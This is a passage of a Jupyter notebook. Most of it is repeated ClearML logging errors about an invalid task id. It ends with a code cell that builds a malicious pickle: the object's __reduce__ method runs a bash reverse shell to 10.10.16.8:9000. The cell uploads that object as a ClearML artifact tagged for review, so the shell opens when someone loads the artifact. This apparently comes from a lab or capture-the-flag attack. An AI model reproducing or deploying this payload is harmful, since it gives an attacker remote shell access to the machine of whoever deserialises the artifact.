      "2024-06-14 03:58:01,920 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:58:01,924 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:58:02,127 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n",
      "2024-06-14 03:58:04,671 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:58:26,133 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:58:27,230 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:58:56,788 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:58:57,699 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:59:27,409 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:59:28,183 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:59:57,967 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:59:58,767 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:00:04,047 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 04:00:04,050 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:00:05,167 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:00:28,838 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:00:29,809 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:00:59,248 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:01:00,366 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:01:29,961 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:01:31,078 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:01:34,910 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 04:01:34,913 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:01:35,684 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:02:00,518 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:02:02,149 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:02:31,246 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:02:33,489 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:03:01,543 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:03:04,002 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:03:32,206 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:03:35,246 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:04:02,773 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:04:04,198 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:04:07,086 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 04:04:07,089 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:04:08,686 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:04:29,172 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:04:31,406 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:04:34,933 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=8)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:04:35,749 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:05:00,686 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:05:02,766 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:05:32,044 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 04:05:33,326 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    }
   ],
   "source": [
    "import os, pty, pickle, socket\n",
    "from clearml import Task\n",
    "class FuckMe:\n",
    "    def __reduce__(self):\n",
    "        return(os.system, ('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.16.8/9000 0>&1\"',))\n",
    "c = FuckMe()\n",
    "\n",
    "t = Task.init(project_name='Black Swan', task_name='duck', tags=[\"review\"], output_uri=True)\n",
    "t.upload_artifact(name='pickle_artifact', artifact_object=c, retries = 1, wait_on_upload=True, extension_name=\".pkl\")"
   ]
  },
  {
   "cell_type": "raw",
   "id": "eee34f0d-74c6-49b1-97c6-dd0c9007a25f",
   "metadata": {},
   "source": [
    "task.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eccf2953-200e-4c73-8b2e-3c442a0c1ca5",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
